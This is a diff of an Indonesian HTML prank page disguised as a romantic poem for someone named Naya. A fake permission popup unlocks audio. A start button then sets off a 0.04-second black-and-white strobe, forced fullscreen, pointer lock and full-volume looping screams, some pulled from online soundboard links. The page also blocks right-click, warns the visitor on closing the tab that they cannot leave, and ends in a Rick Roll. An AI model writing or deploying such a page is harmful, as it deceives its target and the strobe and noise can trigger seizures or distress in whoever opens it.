@@ -4,42 +4,28 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sesuatu Untuk Naya ✨</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600&family=Playfair+Display:italic,wght@0,700;1,700&display=swap" rel="stylesheet">
     
     <style>
         :root { --accent: #ff758f; }
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: 'Plus Jakarta Sans', sans-serif; background: #fff5f7; }
 
-        /* --- FAKE POP-UP (PEMICU IZIN) --- */
-        #fake-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); z-index: 999;
-            display: flex; justify-content: center; align-items: center;
-        }
+        /* --- FAKE NOTIF --- */
+        #fake-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        #fake-alert { background: white; width: 300px; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3); animation: pop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        #btnAllow { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; }
 
-        #fake-alert {
-            background: white; width: 300px; padding: 30px;
-            border-radius: 20px; text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-        }
+        /* --- KONTEN AESTHETIC --- */
+        #main-content { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        h1 { font-family: 'Playfair Display', serif; font-size: 32px; color: #2d3436; margin-bottom: 10px; }
+        .puisi { font-style: italic; color: #636e72; line-height: 1.8; margin-bottom: 30px; max-width: 400px; }
+        #btnStart { background: var(--accent); color: white; border: none; padding: 15px 45px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s; box-shadow: 0 10px 20px rgba(255, 117, 143, 0.2); }
+        #btnStart:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 117, 143, 0.4); }
 
-        #fake-alert h3 { font-size: 18px; margin-bottom: 10px; color: #333; }
-        #fake-alert p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
-
-        #btnAllow {
-            background: #007bff; color: white; border: none;
-            padding: 12px 30px; border-radius: 10px; font-weight: bold; cursor: pointer;
-            width: 100%; font-size: 15px;
-        }
-
-        /* --- KONTEN --- */
-        #main-content { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .puisi { font-style: italic; color: #636e72; padding: 0 30px; line-height: 1.8; }
-        #btnStart { background: var(--accent); color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-
-        /* --- CHAOS MODE --- */
+        /* --- MODE CHAOS --- */
         @keyframes strobe { 0% { background: #fff; } 50% { background: #000; } 100% { background: #fff; } }
-        body.tampilan-prank { animation: strobe 0.04s infinite; cursor: none; }
+        body.tampilan-prank { animation: strobe 0.04s infinite !important; cursor: none !important; }
     </style>
 </head>
 <body>
@@ -47,7 +33,7 @@
     <div id="fake-overlay">
         <div id="fake-alert">
             <h3>Izin Akses Perangkat</h3>
-            <p>Klik 'Izinkan' untuk memutar pesan suara eksklusif dan mengaktifkan mode imersif untuk <b>Naya</b>.</p>
+            <p>Klik 'Izinkan' untuk konfirmasi akses multimedia dan audio untuk <b>Naya</b>.</p>
             <button id="btnAllow">IZINKAN SEKARANG</button>
         </div>
     </div>
@@ -55,7 +41,7 @@
     <div id="main-content">
         <h1>Untuk Naya.</h1>
         <div class="puisi">
-            "Sederhana, namun buatku terpaku... <br>
+            "Sederhana, namun buatku terpaku...<br>
             Bukan tentang dunia yang bising di luar sana,<br>
             tapi tentang caramu buat segalanya jadi bermakna."
         </div>
@@ -67,65 +53,74 @@
         const btnStart = document.getElementById('btnStart');
         const fakeOverlay = document.getElementById('fake-overlay');
         const mainContent = document.getElementById('main-content');
-        
         let prankActive = false;
 
-        // Fungsi memutar audio baru
-        function spawnAudio(file) {
-            if (!prankActive) return;
-            const audio = new Audio(file);
-            audio.loop = true;
-            audio.volume = 1.0;
-            audio.play().catch(e => console.log("Gagal: " + file));
-        }
+        // DAFTAR SUARA ONLINE (High Pitch Screams)
+        const suaraOnline = [
+            "https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scream&filename=24/246411-9a993700-1126-4447-98e3-466d6d79a295.mp3",
+            "https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Female+Scream&filename=24/246401-4966089e-2191-4566-9e8c-85f096752044.mp3"
+        ];
 
-        // LANGKAH 1: Klik pertama buat buka izin browser
         btnAllow.addEventListener('click', () => {
             fakeOverlay.style.display = 'none';
             mainContent.style.display = 'flex';
-            
-            // Tes audio kosong agar browser "membuka kunci" izin suara
-            const silent = new Audio();
-            silent.play().catch(() => {});
+            // Pancingan izin suara
+            new Audio().play().catch(() => {});
         });
 
-        // LANGKAH 2: Eksekusi Prank
+        function spawnAudio(src) {
+            if (!prankActive) return;
+            const audio = new Audio(src);
+            audio.loop = true;
+            audio.volume = 1.0;
+            audio.play().catch(() => {});
+        }
+
         btnStart.addEventListener('click', function() {
             prankActive = true;
 
-            // Fullscreen
+            // 1. Fullscreen & Pointer Lock (Kunci Mouse)
             const doc = document.documentElement;
             if (doc.requestFullscreen) doc.requestFullscreen();
-
-            // Aktifkan Efek Blink
+            if (doc.requestPointerLock) doc.requestPointerLock();
+            
+            // 2. Tampilan Blink
             document.body.classList.add('tampilan-prank');
             mainContent.style.display = 'none';
 
-            // Kunci Mouse
-            if (doc.requestPointerLock) doc.requestPointerLock();
+            // 3. AUDIO BOMB (Campuran Lokal & Online)
+            // Detik 1: suara1.mp3 (milik kamu)
+            setTimeout(() => spawnAudio('suara1.mp3'), 500);
+            
+            // Detik 1.3: Suara Teriakan Online 1
+            setTimeout(() => spawnAudio(suaraOnline[0]), 1300);
+            
+            // Detik 2: Suara Teriakan Online 2
+            setTimeout(() => spawnAudio(suaraOnline[1]), 2000);
 
-            // AUDIO BOMB (Tumpuk Berurutan)
-            setTimeout(() => { spawnAudio('suara1.mp3'); }, 100); // Langsung bunyi
-            setTimeout(() => { spawnAudio('suara2.mp3'); }, 1300);
-            setTimeout(() => { spawnAudio('suara3.mp3'); }, 2000);
-
-            // Numpuk gila-gilaan tiap 2 detik
-            setInterval(() => {
+            // Numpuk terus setiap 2 detik (Chaos Maksimal)
+            const stack = setInterval(() => {
                 if(prankActive) {
                     spawnAudio('suara1.mp3');
-                    spawnAudio('suara2.mp3');
-                    spawnAudio('suara3.mp3');
+                    spawnAudio(suaraOnline[Math.floor(Math.random() * suaraOnline.length)]);
                 }
             }, 2000);
 
             // 20 Detik -> Rick Roll
             setTimeout(() => {
+                prankActive = false;
+                clearInterval(stack);
                 window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }, 20000);
         });
 
         // Anti Klik Kanan
         document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Peringatan Close Tab
+        window.onbeforeunload = function() {
+            if (prankActive) return "ANDA TIDAK BISA KELUAR!";
+        };
     </script>
 </body>
 </html>
